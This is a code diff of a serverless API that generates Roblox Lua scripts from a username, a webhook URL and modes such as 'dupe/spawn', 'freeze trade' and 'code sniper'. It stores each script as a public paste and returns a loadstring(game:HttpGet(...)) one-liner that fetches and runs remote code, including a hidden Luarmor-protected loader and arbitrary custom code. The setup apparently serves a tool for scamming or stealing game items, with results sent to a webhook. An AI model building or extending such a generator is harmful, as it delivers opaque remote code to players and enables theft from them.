@@ -2,39 +2,61 @@
 // api/generate.js
 
 export default async function handler(req, res) {
-    if (req.method !== 'POST') {
-        return res.status(405).json({
-            error: 'Method not allowed'
-        });
-    }
-
-    const {
-        username,
-        webhook,
-        mode,
-        brainrots,
-        skins,
-        gears,
-        customCode,
-        userId
-    } = req.body || {};
-
-    if (!username) {
-        return res.status(400).json({
-            error: 'Username is required'
-        });
-    }
-
     try {
+        console.log("=== /api/generate START ===");
+
+        console.log("Method:", req.method);
+        console.log("Body:", req.body);
+
+        if (req.method !== 'POST') {
+            return res.status(405).json({
+                error: 'Method not allowed'
+            });
+        }
+
+        const body = req.body || {};
+
+        const {
+            username,
+            webhook,
+            mode,
+            brainrots,
+            skins,
+            gears,
+            customCode,
+            userId
+        } = body;
+
+        console.log("username:", username);
+        console.log("mode:", mode);
+        console.log("brainrots:", brainrots);
+        console.log("skins:", skins);
+        console.log("gears:", gears);
+        console.log("customCode:", !!customCode);
+        console.log("userId:", userId);
+
+        if (!username) {
+            return res.status(400).json({
+                error: 'Username is required'
+            });
+        }
+
+        console.log("Calling buildScript...");
+
         const script = buildScript(
             username,
             webhook,
             mode,
-            brainrots || [],
-            skins || [],
-            gears || [],
+            Array.isArray(brainrots) ? brainrots : [],
+            Array.isArray(skins) ? skins : [],
+            Array.isArray(gears) ? gears : [],
             customCode || ''
         );
+
+        console.log("buildScript OK");
+        console.log("Script length:", script.length);
+
+        console.log("Calling saveToInternalPaste...");
 
         const pasteId = await saveToInternalPaste(
             script,
@@ -42,37 +64,49 @@ export default async function handler(req, res) {
             userId
         );
 
+        console.log("saveToInternalPaste OK");
+        console.log("pasteId:", pasteId);
+
         const baseUrl =
             process.env.BASE_URL || 'https://oblivionhub.xyz';
 
         const rawUrl =
             `${baseUrl}/api/paste?id=${pasteId}&raw=true`;
 
+        console.log("rawUrl:", rawUrl);
+
         return res.status(200).json({
             loadstring:
                 `loadstring(game:HttpGet("${rawUrl}"))()`,
 
-            script: script,
+            script,
 
             pasteUrl: rawUrl,
 
-            pasteId: pasteId,
+            pasteId,
 
             obfuscated: false
         });
 
     } catch (error) {
-        console.error('Error general:', error);
+
+        console.error("================================");
+        console.error("GENERATE ERROR");
+        console.error("================================");
+
+        console.error("Name:", error?.name);
+        console.error("Message:", error?.message);
+        console.error("Stack:", error?.stack);
 
         return res.status(500).json({
-            error: error.message || 'Internal server error'
+            error: error?.message || 'Internal server error'
         });
     }
 }
 
 
 // ============================================================
-//  CONSTRUIR SCRIPT
+// BUILD SCRIPT
 // ============================================================
 
 function buildScript(
@@ -85,9 +119,7 @@ function buildScript(
     customCode
 ) {
 
-    // ========================================================
-    //  CONVERTIR ARRAY A TABLA LUA
-    // ========================================================
+    console.log("buildScript mode:", mode);
 
     function luaTable(arr, indent = '    ') {
 
@@ -96,6 +128,7 @@ function buildScript(
         }
 
         const items = arr.map(item => {
+
             const value = String(item)
                 .replace(/\\/g, '\\\\')
                 .replace(/"/g, '\\"');
@@ -113,19 +146,18 @@ function buildScript(
     }
 
 
-    // ========================================================
-    //  VARIABLES GLOBALES
-    // ========================================================
-
-    const safeUsername = String(username)
-        .replace(/\\/g, '\\\\')
-        .replace(/"/g, '\\"');
-
-    const safeWebhook = webhook
-        ? String(webhook)
+    const safeUsername =
+        String(username)
             .replace(/\\/g, '\\\\')
-            .replace(/"/g, '\\"')
-        : 'WEBHOOK_URL';
+            .replace(/"/g, '\\"');
+
+
+    const safeWebhook =
+        webhook
+            ? String(webhook)
+                .replace(/\\/g, '\\\\')
+                .replace(/"/g, '\\"')
+            : 'WEBHOOK_URL';
 
 
     let script =
@@ -145,7 +177,7 @@ function buildScript(
 
 
     // ========================================================
-    //  LUARMOR BASE ACTUAL
+    // LUARMOR BASE
     // ========================================================
 
     const GUI_BASE =
@@ -153,7 +185,7 @@ function buildScript(
 
 
     // ========================================================
-    //  GITHUB DE CADA GUI
+    // GITHUB
     // ========================================================
 
     const GUI_GITHUB = {
@@ -170,7 +202,7 @@ function buildScript(
 
 
     // ========================================================
-    //  NORMAL
+    // NORMAL
     // ========================================================
 
     if (mode === 'normal') {
@@ -185,18 +217,14 @@ end)`;
 
 
     // ========================================================
-    //  ADMIN PANEL
-    //
-    //  LUARMOR + GUIAP.LUA
+    // ADMIN PANEL
     // ========================================================
 
     else if (mode === 'adminpanel') {
 
         script += `
 
--- ============================================================
 -- GUI ADMIN PANEL
--- ============================================================
 
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
@@ -210,18 +238,14 @@ end)`;
 
 
     // ========================================================
-    //  DUPE / SPAWN
-    //
-    //  LUARMOR + GUIDUPE.LUA
+    // DUPE / SPAWN
     // ========================================================
 
     else if (mode === 'dupespawn') {
 
         script += `
 
--- ============================================================
 -- GUI DUPE / SPAWN
--- ============================================================
 
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
@@ -235,18 +259,14 @@ end)`;
 
 
     // ========================================================
-    //  CODE SNIPER
-    //
-    //  LUARMOR + SNIPER.LUA
+    // CODE SNIPER
     // ========================================================
 
     else if (mode === 'codesniper') {
 
         script += `
 
--- ============================================================
 -- GUI CODE SNIPER
--- ============================================================
 
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
@@ -260,23 +280,12 @@ end)`;
 
 
     // ========================================================
-    //  FREEZE TRADE
-    // ========================================================
-    //
-    //  IMPORTANTE:
-    //  Se mantiene temporalmente con el loader base porque
-    //  todavía no tenemos confirmado el Luarmor NUEVO de
-    //  Freeze Trade.
-    //
+    // FREEZE TRADE
     // ========================================================
 
     else if (mode === 'freezetrade') {
 
         script += `
-
--- ============================================================
--- GUI FREEZE TRADE
--- ============================================================
 
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
@@ -286,16 +295,12 @@ end)`;
 
 
     // ========================================================
-    //  CUSTOM
+    // CUSTOM
     // ========================================================
 
     else if (mode === 'custom') {
 
         script += `
-
--- ============================================================
--- GUI CUSTOM BASE
--- ============================================================
 
 task.spawn(function()
     loadstring(game:HttpGet("${GUI_BASE}"))()
@@ -312,17 +317,13 @@ end)`;
                     .replace(/\r?\n/g, '\n    ');
 
             script +=
-                `\n\n` +
-                `task.spawn(function()\n` +
+                `\n\ntask.spawn(function()\n` +
                 `    ${formattedCustomCode}\n` +
                 `end)`;
         }
+
     }
 
-
-    // ========================================================
-    //  MODO DESCONOCIDO
-    // ========================================================
 
     else {
 
@@ -337,7 +338,7 @@ end)`;
 
 
 // ============================================================
-//  GUARDAR EN PASTEFY INTERNO
+// SAVE PASTE
 // ============================================================
 
 async function saveToInternalPaste(
@@ -348,6 +349,11 @@ async function saveToInternalPaste(
 
     const baseUrl =
         process.env.BASE_URL || 'https://oblivionhub.xyz';
+
+    console.log(
+        "saveToInternalPaste URL:",
+        `${baseUrl}/api/paste`
+    );
 
 
     const response = await fetch(
@@ -360,45 +366,29 @@ async function saveToInternalPaste(
             },
 
             body: JSON.stringify({
-                content: content,
-
-                title:
-                    title || 'Untitled',
-
-                userId:
-                    userId || null,
-
+                content,
+                title: title || 'Untitled',
+                userId: userId || null,
                 public: true
             })
         }
     );
 
 
+    console.log(
+        "Paste response status:",
+        response.status
+    );
+
+
     if (!response.ok) {
 
-        let errorMessage =
-            'Error al guardar el paste';
+        const text =
+            await response.text();
 
-        try {
-
-            const error =
-                await response.json();
-
-            errorMessage =
-                error.error ||
-                errorMessage;
-
-        } catch (_) {
-
-            const text =
-                await response.text();
-
-            if (text) {
-                errorMessage = text;
-            }
-        }
-
-        throw new Error(errorMessage);
+        throw new Error(
+            `Paste API error ${response.status}: ${text}`
+        );
     }
 
 
@@ -407,8 +397,9 @@ async function saveToInternalPaste(
 
 
     if (!data.id) {
+
         throw new Error(
-            'No se recibió ID del paste'
+            'Paste API did not return an ID'
         );
     }
 
